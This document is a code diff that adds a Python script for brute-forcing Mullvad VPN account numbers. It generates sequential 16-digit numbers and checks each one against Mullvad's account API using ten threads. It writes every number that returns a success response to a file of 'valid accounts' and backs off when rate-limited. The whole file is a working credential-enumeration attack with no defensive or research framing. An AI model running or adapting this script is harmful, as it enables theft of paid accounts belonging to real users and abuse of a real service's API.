@@ -1,0 +1,40 @@
+import requests
+import concurrent.futures
+import time
+
+# Define API endpoint
+API_URL = "https://api.mullvad.net/www/accounts/v1/"
+
+# Output file for valid accounts
+VALID_ACCOUNTS = "valid_accounts.txt"
+
+# Ensure the output file exists
+open(VALID_ACCOUNTS, "a").close()
+
+print(f"Starting the account validation process. Results will be saved to {VALID_ACCOUNTS}.")
+
+def check_account(account_number):
+    """Check if an account number is valid by sending a request to the API."""
+    try:
+        response = requests.get(f"{API_URL}{account_number}/", timeout=5)
+        if response.status_code == 200:
+            with open(VALID_ACCOUNTS, "a") as file:
+                file.write(f"{account_number}\n")
+            print(f"Valid account: {account_number}")
+        elif response.status_code == 429:
+            print("Rate limit reached. Pausing for 10 seconds.")
+            time.sleep(10)  # Adjust to handle rate-limiting gracefully
+    except requests.RequestException as e:
+        print(f"Error checking account {account_number}: {e}")
+
+# Generate all 16-digit combinations
+account_numbers = (str(i) for i in range(1000000000000000, 1000000000009999))  # Adjust range as needed
+
+# Use a ThreadPoolExecutor to process accounts concurrently
+with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:  # Adjust the number of threads if needed
+    futures = {executor.submit(check_account, account): account for account in account_numbers}
+    for future in concurrent.futures.as_completed(futures):
+        try:
+            future.result()
+        except Exception as e:
+            print(f"An error occurred: {e}")
